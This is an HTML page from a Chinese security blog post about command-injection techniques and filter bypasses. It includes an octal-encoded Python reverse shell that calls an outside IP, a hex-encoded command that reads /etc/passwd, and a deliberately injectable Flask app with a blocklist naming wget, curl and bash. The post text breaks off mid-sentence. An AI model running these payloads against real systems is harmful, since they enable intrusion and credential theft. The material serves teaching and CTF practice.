@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="passerpriest">
+
+
+    <meta name="subtitle" content="PASSERPRIEST">
+
+
+    <meta name="description" content="PASSERPRIEST">
+
+
+
+<title>命令执行详解 | PASSERPRIEST</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">PASSERPRIEST BLOG</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/item">Items</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">PASSERPRIEST BLOG</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/item">Items</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">命令执行详解</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">passerpriest</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">二月 20, 2023&nbsp;&nbsp;20:26:09</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/">漏洞类型</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <p>管道符：</p>
+<p>Windows:|–&gt;直接执行后面的语句</p>
+<p>​    ||–&gt;如果前面执行的语句执行出错，则执行后面的语句</p>
+<p>​    &amp;–&gt;如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</p>
+<p>​    &amp;&amp;–&gt;如果前面的语句为真先执行第一个命令后执行第二个命令；为假 则直接出错，也不执行后面的语句</p>
+<p>linux:   ;–&gt;执行完前面的命令执行后面的</p>
+<p>​    |–&gt;显示后面语句的执行结果</p>
+<p>​    ||–&gt;当前面的语句执行出错时，执行后面的语句</p>
+<p>​    &amp;–&gt;如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</p>
+<p>​    &amp;&amp;–&gt;如果前面的语句为真先执行第一个命令后执行第二个命令；为假 则直接出错，也不执行后面的语句</p>
+<p>​    ()–&gt;如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用圆括号()把所有命令组合起</p>
+<p>常见危险函数：</p>
+<p>1.system()：执行shell命令，向dos发送一条指令，如system(&quot;pause&quot;)可以实现冻结屏幕，便于观察程序的执行结果；system(&quot;CLS&quot;)可以实现清屏操作；而调用color函数可以改变控制台的前景色和背景。</p>
+<p>int system(const char *command)</p>
+<p>2.passthru()：只调用命令，不返回任何结果，但把命令的运行结果原样地直接输出到标准输出设备上</p>
+<p>3.exec()：在PHP中，执行一个外部程序， exec() 执行 command 参数所指定的命令。</p>
+<p>语法： exec(string $command, array &amp;$output &#x3D; ?, int &amp;$return_var &#x3D; ?): string</p>
+<p>4.shell_exec()：是PHP中的一个内置函数，用于通过shell执行命令并以字符串的形式返回完整的输出</p>
+<p>5.popen()：通过创建一个管道，调用 fork 产生一个子进程，执行一个 shell 以运行命令来开启一个进程。这个进程必须由 pclose() 函数关闭，而不是 fclose() 函数。pclose() 函数关闭标准 I&#x2F;O 流，等待命令执行结束，然后返回 shell 的终止状态。如果 shell 不能被执行，则 pclose() 返回的终止状态与 shell 已执行 exit 一样。</p>
+<p>语法：FILE * popen ( const char * command , const char * type );</p>
+<p>​    int pclose ( FILE * stream );</p>
+<p>6.proc_open()：执行一个命令，并且打开用来输入&#x2F;输出的文件指针，类似 popen() 函数， 但是 proc_open() 提供了更加强大的控制程序执行的能力。</p>
+<p>语法：resource proc_open ( string $cmd , array $descriptorspec , array &amp;$pipes [, string $cwd [, array $env [, array $other_options ]]] )</p>
+<p>7.pcntl_exec()：在当前进程空间执行指定程序</p>
+<p>语法：void pcntl_exec ( string $path [, array $args [, array $envs ]] ) </p>
+<p>8.ob_start()：打开输出控制缓冲，此函数将打开输出缓冲。当输出缓冲激活后，脚本将不会输出内容（消息头除外），相反需要输出的内容被存储在内部缓冲区中。</p>
+<p>语法：ob_start(callable $callback &#x3D; null, int $chunk_size &#x3D; 0, int $flags &#x3D; PHP_OUTPUT_HANDLER_STDFLAGS): bool</p>
+<p>9.eval()：把字符串作为PHP代码执行</p>
+<p>语法：eval(string $code): mixed</p>
+<p>10.assert()：检查断言是否为 false</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">https://www.php.net/manual/zh/function.assert.php</a></p>
+<p>11.preg_replace：执行一个正则表达式的搜索和替换</p>
+<p>12.phpinfo()：这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息</p>
+<p>13.symlink()：一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容</p>
+<p>14.getenv：获取一个环境变量的值</p>
+<p>15.putenv($a)：添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态</p>
+<p>16.&#96;(反单引号)：用反引号，将shell命令引起来，可以将命令的输出值赋给变量。ps：$() 与 反引号 &#96;&#96; 其实效果是一样的</p>
+<p>常见过滤绕过</p>
+<p>编码绕过</p>
+<p>如果命令注入的网站过滤了某些分割符，可以将分隔符编码后（url编码，base64等）绕过</p>
+<p>八进制绕过</p>
+<p>$(printf “\154\163”)&#x2F;&#x2F;ls命令，这个编码后可以拼接</p>
+<p>&#x2F;&#x2F;这里过滤了-.等符号，只允许0-9a-zA-Z”&gt;\$();</p>
+<p>echo$IFS$9$(printf$IFS$9”\163\75\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\163\157\143\153\145\164\50\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\101\106\137\111\116\105\124\54\137\137\151\155\160\157\162\164\137\137\50\42\163\157\143\153\145\164\42\51\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\42\64\67\56\61\60\60\56\61\62\60\56\61\62\63\42\54\62\63\63\63\51\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\137\137\151\155\160\157\162\164\137\137\50\42\157\163\42\51\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\160\75\137\137\151\155\160\157\162\164\137\137\50\42\163\165\142\160\162\157\143\145\163\163\42\51\56\143\141\154\154\50\133\42\57\142\151\156\57\142\141\163\150\42\54\42\55\151\42\135\51\73”)&gt;$(printf$IFS$9”\57”)detect$(printf$IFS$9”\56”)py</p>
+<p>echo ‘python反弹shell的payload’ &gt; &#x2F;detect.py</p>
+<p>1</p>
+<p>2</p>
+<p>3</p>
+<p>from flask import Flask</p>
+<p>from flask import render_template,request</p>
+<p>import subprocess,re</p>
+<p>app &#x3D; Flask(<strong>name</strong>)</p>
+<p>@app.route(‘&#x2F;‘,methods&#x3D;[‘GET’])</p>
+<p>def index():</p>
+<p>  return render_template(‘index.html’)</p>
+<p>@app.route(‘&#x2F;run’,methods&#x3D;[‘POST’])</p>
+<p>def run():</p>
+<p>  cmd &#x3D; request.form.get(“cmd”)</p>
+<p>  if re.search(r’’’[^0-9a-zA-Z”&gt;\$();]’’’,cmd):</p>
+<p>​    return ‘Hacker!’</p>
+<p>  if re.search(r’’’ping|wget|curl|bash|perl|python|php|kill|ps’’’,cmd):</p>
+<p>​    return ‘Hacker!’</p>
+<p>  p &#x3D; subprocess.Popen(cmd,stderr&#x3D;subprocess.STDOUT, stdout&#x3D;subprocess.PIPE,shell&#x3D;True,close_fds&#x3D;True)</p>
+<p>  try:</p>
+<p>​    (msg, errs) &#x3D; p.communicate(timeout&#x3D;5)</p>
+<p>​    return msg</p>
+<p>  except Exception as e:</p>
+<p>​    return ‘Error!’</p>
+<p>app.run(host&#x3D;’0.0.0.0’,port&#x3D;’5000’)</p>
+<p> 十六进制绕过</p>
+<p>echo “636174202F6574632F706173737764” | xxd -r -p|bash</p>
+<p> 十六进制字符序列</p>
+<p>值得注意的是，这种方法不适用于所有PHP函数，这种变量函数方法不能用于构造诸如echo、print、unset()、isset()、empty()、include、require等系统特殊函数，但可以使用包装函数来构造它们</p>
+<p> 空格过滤</p>
+<p>linux内置分隔符：${IFS}，$IFS，$IFS$9</p>
+<p> 利用重定向符&lt;&gt;</p>
+<p>&gt;，+过滤</p>
+<p>对于 &gt;,+ 等 符号的过滤 ，$PS2变量为&gt;，$PS4变量则为+</p>
+<p>关键词绕过</p>
+<p>通过拆分命令达到绕过的效果：a&#x3D;l;b&#x3D;s;$a$b</p>
+<p>空变量绕过：cat fl${x}ag cat tes$(z)t&#x2F;flag</p>
+<p>控制环境变量绕过：</p>
+<p>先利用echo $PATH得到环境变量 &#x3D;&gt; “&#x2F;usr&#x2F;local&#x2F;….blablabla”</p>
+<p>接着利用echo $</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>passerpriest</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://passerpriest.github.io/2023/02/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%AF%A6%E8%A7%A3/">https://passerpriest.github.io/2023/02/20/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E8%AF%A6%E8%A7%A3/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E5%8E%9F%E5%88%9B/"># 原创</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2023/02/22/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">BUUCTF刷题笔记</a>
+            
+            
+            <a class="next" rel="next" href="/2023/01/16/AOIAWD%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E4%BD%BF%E7%94%A8/">AOIAWD的搭建与使用</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    <script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: '5d0e03deb09905c18da1',
+        clientSecret: 'ea6a3ef1bb36ae308933ebe7fc6f9960a99d94f9',
+        repo: 'passerpriest.github.io',
+        owner: 'passerpriest',
+        admin: 'passerpriest',
+        id: md5(location.pathname),
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 20,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© passerpriest since 2023|
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+</span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
